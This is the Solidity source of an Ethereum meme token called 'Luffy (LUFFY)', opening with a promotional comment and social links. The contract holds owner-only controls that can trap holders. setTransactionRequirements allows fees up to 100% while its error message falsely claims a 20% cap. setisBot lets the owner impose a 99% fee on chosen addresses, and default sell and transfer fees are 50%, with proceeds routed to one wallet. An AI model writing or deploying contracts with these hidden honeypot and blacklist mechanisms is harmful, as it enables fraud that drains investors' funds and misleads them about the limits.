1 /**
2 Luffy (LUFFY) - Unleashing the Power of Gear 5 and Reigniting the Anime Meta on Ethereum!
3 
4 August 6, is episode release for Gear 5 of Monkey D. Luffy for his SunGod Nika awakening! 
5 It is the most hyped episode release in anime history. 
6 
7 // WE WILL BRING BACK ANIME META
8 
9 Website: https://luffytoken.org/
10 Telegram: https://t.me/luffycoinerc
11 Twitter: https://twitter.com/luffyerc
12 
13 */
14 
15 // SPDX-License-Identifier: MIT
16 
17 pragma solidity 0.8.19;
18 
19 
20 library SafeMath {
21 
22     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
23         unchecked {
24             uint256 c = a + b;
25             if (c < a) return (false, 0);
26             return (true, c);
27         }
28     }
29 
30     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
31         unchecked {
32             if (b > a) return (false, 0);
33             return (true, a - b);
34         }
35     }
36 
37     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
38         unchecked {
39             if (a == 0) return (true, 0);
40             uint256 c = a * b;
41             if (c / a != b) return (false, 0);
42             return (true, c);
43         }
44     }
45 
46     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
47         unchecked {
48             if (b == 0) return (false, 0);
49             return (true, a / b);
50         }
51     }
52 
53     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
54         unchecked {
55             if (b == 0) return (false, 0);
56             return (true, a % b);
57         }
58     }
59 
60     function add(uint256 a, uint256 b) internal pure returns (uint256) {
61         return a + b;
62     }
63 
64     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
65         return a - b;
66     }
67 
68     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
69         return a * b;
70     }
71 
72     function div(uint256 a, uint256 b) internal pure returns (uint256) {
73         return a / b;
74     }
75 
76     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
77         return a % b;
78     }
79 
80     function sub(
81         uint256 a,
82         uint256 b,
83         string memory errorMessage
84     ) internal pure returns (uint256) {
85         unchecked {
86             require(b <= a, errorMessage);
87             return a - b;
88         }
89     }
90 
91     function div(
92         uint256 a,
93         uint256 b,
94         string memory errorMessage
95     ) internal pure returns (uint256) {
96         unchecked {
97             require(b > 0, errorMessage);
98             return a / b;
99         }
100     }
101 
102     function mod(
103         uint256 a,
104         uint256 b,
105         string memory errorMessage
106     ) internal pure returns (uint256) {
107         unchecked {
108             require(b > 0, errorMessage);
109             return a % b;
110         }
111     }
112 }
113 
114 interface IERC20 {
115     function decimals() external view returns (uint8);
116     function symbol() external view returns (string memory);
117     function name() external view returns (string memory);
118     function getOwner() external view returns (address);
119     function totalSupply() external view returns (uint256);
120     function balanceOf(address account) external view returns (uint256);
121     function transfer(address recipient, uint256 amount) external returns (bool);
122     function allowance(address _owner, address spender) external view returns (uint256);
123     function approve(address spender, uint256 amount) external returns (bool);
124     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
125     event Transfer(address indexed from, address indexed to, uint256 value);
126     event Approval(address indexed owner, address indexed spender, uint256 value);}
127 
128 abstract contract Ownable {
129     address internal owner;
130     constructor(address _owner) {owner = _owner;}
131     modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
132     function isOwner(address account) public view returns (bool) {return account == owner;}
133     function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
134     event OwnershipTransferred(address owner);
135 }
136 
137 interface IFactory{
138         function createPair(address tokenA, address tokenB) external returns (address pair);
139         function getPair(address tokenA, address tokenB) external view returns (address pair);
140 }
141 
142 interface IRouter {
143     function factory() external pure returns (address);
144     function WETH() external pure returns (address);
145     function addLiquidityETH(
146         address token,
147         uint amountTokenDesired,
148         uint amountTokenMin,
149         uint amountETHMin,
150         address to,
151         uint deadline
152     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
153 
154     function swapExactTokensForETHSupportingFeeOnTransferTokens(
155         uint amountIn,
156         uint amountOutMin,
157         address[] calldata path,
158         address to,
159         uint deadline) external;
160 }
161 
162 contract LUFFY is IERC20, Ownable {
163     using SafeMath for uint256;
164     string private constant _name = 'Luffy';
165     string private constant _symbol = 'LUFFY';
166     uint8 private constant _decimals = 9;
167     uint256 private _totalSupply = 1000000000000 * (10 ** _decimals);
168     mapping (address => uint256) _balances;
169     mapping (address => mapping (address => uint256)) private _allowances;
170     mapping (address => bool) public isFeeExempt;
171     mapping (address => bool) private isBot;
172     IRouter router;
173     address public pair;
174     bool private tradingAllowed = false;
175     bool private swapEnabled = true;
176     uint256 private swapTimes;
177     bool private swapping;
178     uint256 swapAmount = 4;
179     uint256 private swapThreshold = ( _totalSupply * 1000 ) / 100000;
180     uint256 private minTokenAmount = ( _totalSupply * 10 ) / 100000;
181     modifier lockTheSwap {swapping = true; _; swapping = false;}
182     uint256 private liquidityFee = 0;
183     uint256 private marketingFee = 500;
184     uint256 private developmentFee = 500;
185     uint256 private burnFee = 0;
186     uint256 private totalFee = 3000;
187     uint256 private sellFee = 5000;
188     uint256 private transferFee = 5000;
189     uint256 private denominator = 10000;
190     address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
191     address internal development_receiver = 0x2f9b3424C4733092D8F7A4a13bD2676f42132f04; 
192     address internal marketing_receiver = 0x2f9b3424C4733092D8F7A4a13bD2676f42132f04;
193     address internal liquidity_receiver = 0x2f9b3424C4733092D8F7A4a13bD2676f42132f04;
194     uint256 public _maxTxAmount = ( _totalSupply * 200 ) / 10000;
195     uint256 public _maxSellAmount = ( _totalSupply * 200 ) / 10000;
196     uint256 public _maxWalletToken = ( _totalSupply * 200 ) / 10000;
197 
198     constructor() Ownable(msg.sender) {
199         IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
200         address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
201         router = _router; pair = _pair;
202         isFeeExempt[address(this)] = true;
203         isFeeExempt[liquidity_receiver] = true;
204         isFeeExempt[marketing_receiver] = true;
205         isFeeExempt[development_receiver] = true;
206         isFeeExempt[msg.sender] = true;
207         _balances[msg.sender] = _totalSupply;
208         emit Transfer(address(0), msg.sender, _totalSupply);
209     }
210 
211     receive() external payable {}
212     function name() public pure returns (string memory) {return _name;}
213     function symbol() public pure returns (string memory) {return _symbol;}
214     function decimals() public pure returns (uint8) {return _decimals;}
215     function startTrading() external onlyOwner {tradingAllowed = true;}
216     function getOwner() external view override returns (address) { return owner; }
217     function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
218     function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
219     function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
220     function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}
221     function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
222     function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
223 
224     function shouldContractSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {
225         bool aboveMin = amount >= minTokenAmount;
226         bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
227         return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender] && recipient == pair && swapTimes >= swapAmount && aboveThreshold;
228     }
229 
230     function setContractSwapSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {
231         swapAmount = _swapAmount; swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000)); 
232         minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));
233     }
234 
235     function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
236         liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;
237         require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "totalFee and sellFee cannot be more than 20%");
238     }
239 
240     function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
241         uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);
242         _maxTxAmount = newTx; _maxSellAmount = newTransfer; _maxWalletToken = newWallet;
243         uint256 limit = totalSupply().mul(5).div(1000);
244         require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
245     }
246 
247     function setInternalAddresses(address _marketing, address _liquidity, address _development) external onlyOwner {
248         marketing_receiver = _marketing; liquidity_receiver = _liquidity; development_receiver = _development;
249         isFeeExempt[_marketing] = true; isFeeExempt[_liquidity] = true; isFeeExempt[_development] = true;
250     }
251 
252     function setisBot(address[] calldata addresses, bool _enabled) external onlyOwner {
253         for(uint i=0; i < addresses.length; i++){
254         isBot[addresses[i]] = _enabled; }
255     }
256 
257     function manualSwap() external onlyOwner {
258         uint256 amount = balanceOf(address(this));
259         if(amount > swapThreshold){amount = swapThreshold;}
260         swapAndLiquify(amount);
261     }
262 
263     function rescueERC20(address _address, uint256 percent) external onlyOwner {
264         uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
265         IERC20(_address).transfer(development_receiver, _amount);
266     }
267 
268     function swapAndLiquify(uint256 tokens) private lockTheSwap {
269         uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
270         uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
271         uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
272         uint256 initialBalance = address(this).balance;
273         swapTokensForETH(toSwap);
274         uint256 deltaBalance = address(this).balance.sub(initialBalance);
275         uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
276         uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
277         if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
278         uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
279         if(marketingAmt > 0){payable(marketing_receiver).transfer(marketingAmt);}
280         uint256 contractBalance = address(this).balance;
281         if(contractBalance > uint256(0)){payable(development_receiver).transfer(contractBalance);}
282     }
283 
284     function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
285         _approve(address(this), address(router), tokenAmount);
286         router.addLiquidityETH{value: ETHAmount}(
287             address(this),
288             tokenAmount,
289             0,
290             0,
291             liquidity_receiver,
292             block.timestamp);
293     }
294 
295     function swapTokensForETH(uint256 tokenAmount) private {
296         address[] memory path = new address[](2);
297         path[0] = address(this);
298         path[1] = router.WETH();
299         _approve(address(this), address(router), tokenAmount);
300         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
301             tokenAmount,
302             0,
303             path,
304             address(this),
305             block.timestamp);
306     }
307 
308     function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
309         return !isFeeExempt[sender] && !isFeeExempt[recipient];
310     }
311 
312     function getTotalFee(address sender, address recipient) internal view returns (uint256) {
313         if(isBot[sender] || isBot[recipient]){return denominator.sub(uint256(100));}
314         if(recipient == pair){return sellFee;}
315         if(sender == pair){return totalFee;}
316         return transferFee;
317     }
318 
319     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
320         if(getTotalFee(sender, recipient) > 0){
321         uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
322         _balances[address(this)] = _balances[address(this)].add(feeAmount);
323         emit Transfer(sender, address(this), feeAmount);
324         if(burnFee > uint256(0) && getTotalFee(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
325         return amount.sub(feeAmount);} return amount;
326     }
327 
328     function _transfer(address sender, address recipient, uint256 amount) private {
329         require(sender != address(0), "ERC20: transfer from the zero address");
330         require(recipient != address(0), "ERC20: transfer to the zero address");
331         require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
332         if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, "tradingAllowed");}
333         if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(DEAD)){
334         require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
335         if(sender != pair){require(amount <= _maxSellAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");}
336         require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded"); 
337         if(recipient == pair && !isFeeExempt[sender]){swapTimes += uint256(1);}
338         if(shouldContractSwap(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
339         _balances[sender] = _balances[sender].sub(amount);
340         uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
341         _balances[recipient] = _balances[recipient].add(amountReceived);
342         emit Transfer(sender, recipient, amountReceived);
343     }
344 
345     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
346         _transfer(sender, recipient, amount);
347         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
348         return true;
349     }
350 
351     function _approve(address owner, address spender, uint256 amount) private {
352         require(owner != address(0), "ERC20: approve from the zero address");
353         require(spender != address(0), "ERC20: approve to the zero address");
354         _allowances[owner][spender] = amount;
355         emit Approval(owner, spender, amount);
356     }
357 }